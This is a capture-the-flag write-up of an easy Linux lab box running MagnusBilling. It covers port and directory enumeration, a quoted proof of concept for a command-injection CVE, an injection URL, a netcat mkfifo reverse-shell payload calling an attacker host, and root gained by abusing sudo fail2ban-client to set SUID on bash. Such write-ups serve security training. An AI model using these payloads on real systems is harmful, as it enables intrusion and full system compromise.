# Writeup: Billing

**OS**: 🐧 Linux

**Level**: 🟢 Easy

## 🔎 Enumeration:

Nmap scan:

```shell
nmap -sS -sVC -Pn -vv -T4 -p- -oN nmap_scan $TARGET
```

Result:

```
# Nmap 7.95 scan initiated Thu Nov 27 02:55:41 2025 as: /usr/lib/nmap/nmap -sS -sVC -Pn -vv -T4 -p- -oN nmap_scan 10.80.173.96
Nmap scan report for 10.80.173.96
Host is up, received user-set (0.050s latency).
Scanned at 2025-11-27 02:55:42 EST for 38s
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE  REASON         VERSION
22/tcp   open  ssh      syn-ack ttl 62 OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 27:31:35:a5:04:ca:99:f4:75:eb:f2:f1:3b:80:5b:39 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBICVNaJHhCAS58Po20dB6Y8Kh10MrkyWsdy3fmVJqDR7bDzNX01c6u83GJhhktFKoJT+utuq6v4FLGOc3VXAiSI=
|   256 20:bc:0f:94:b9:5c:ac:72:ea:a4:06:75:8e:a3:56:0d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAOyqUIg0PhlhOdghwqY6XLGY8dzObXdC01ImpyX5dgn
80/tcp   open  http     syn-ack ttl 62 Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
| http-robots.txt: 1 disallowed entry 
|_/mbilling/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title:             MagnusBilling        
|_Requested resource was http://10.80.173.96/mbilling/
3306/tcp open  mysql    syn-ack ttl 62 MariaDB 10.3.23 or earlier (unauthorized)
5038/tcp open  asterisk syn-ack ttl 62 Asterisk Call Manager 2.10.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Nov 27 02:56:20 2025 -- 1 IP address (1 host up) scanned in 38.90 seconds
```

On port 80 i found a apache webserver running a MagnusBilling, which is a opensource VoIP billing system. I have done a directory bruteforce with `gobuster`, which gives me some stuff to inspect.

```
gobuster dir -u http://10.80.173.96/mbilling/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt -t 40 -x php -o gobuster_scan
```

```
/tmp                  (Status: 301) [Size: 319] [--> http://10.80.173.96/mbilling/tmp/]
/lib                  (Status: 301) [Size: 319] [--> http://10.80.173.96/mbilling/lib/]
/assets               (Status: 301) [Size: 322] [--> http://10.80.173.96/mbilling/assets/]
/archive              (Status: 301) [Size: 323] [--> http://10.80.173.96/mbilling/archive/]
/resources            (Status: 301) [Size: 325] [--> http://10.80.173.96/mbilling/resources/]
/index.php            (Status: 200) [Size: 663]
/cron.php             (Status: 200) [Size: 0]
/protected            (Status: 403) [Size: 277]
/fpdf                 (Status: 301) [Size: 320] [--> http://10.80.173.96/mbilling/fpdf/]
/LICENSE              (Status: 200) [Size: 7652]
```

After some research i found a `README.md` file containing the running version which is `7.x.x`. I used `searchsploit` to check this version for known exploits and i have found `CVE-2023-30258`.

```
# Exploit Title: MagnusSolution magnusbilling 7.3.0 - Command Injection
# Date: 2024-10-26
# Exploit Author: CodeSecLab
# Vendor Homepage: https://github.com/magnussolution/magnusbilling7
# Software Link: https://github.com/magnussolution/magnusbilling7
# Version: 7.3.0
# Tested on: Centos
# CVE : CVE-2023-30258


# PoC URL for Command Injection

http://magnusbilling/lib/icepay/icepay.php?democ=testfile; id > /tmp/injected.txt

Result: This PoC attempts to inject the id command.

[Replace Your Domain Name]
```

## 💥 Exploitation:

I have tried `http://billing.thm/lib/icepay/icepay.php?democ=testfile; id > /tmp/x.txt;` but the file was not created under `http://billing.thm/tmp/x.txt`, so i have started a icmp listener with `tcpdump` and tried `http://billing.thm/lib/icepay/icepay.php?democ=testfile;ping -c 3 10.10.10.10;` which was successful, so rce is verified.

I have started a `netcat` listener and with the payload `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f` i got a shell as the user `asterisk`.

I found the `user.txt` inside of the user `magnus` home directory, which is world readable, so i was able to just grab the flag.

## 🔓 Priviledge Escalation:

I found out with `sudo -l`, that i was able to execute the `fail2ban-client` as root without providing a password, which i have abused to set the suid bit on `/bin/bash` and gain a root shell to read the `root.txt`.

```
...
User asterisk may run the following commands on ip-10-80-173-96:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
...
```

```shell
sudo /usr/bin/fail2ban-client status

sudo /usr/bin/fail2ban-client get asterisk-iptables actions

sudo /usr/bin/fail2ban-client set asterisk-iptables addaction evil

sudo /usr/bin/fail2ban-client set asterisk-iptables action evil actionban "chmod +s /bin/bash"

sudo /usr/bin/fail2ban-client set asterisk-iptables banip 1.2.3.4

/bin/bash -p
```

## 💰 Loot:

```shell
# user.txt
THM{4a6831d5f124b25eefb1e9**********}

# root.txt
THM{33ad5b530e71a172648f42**********}
```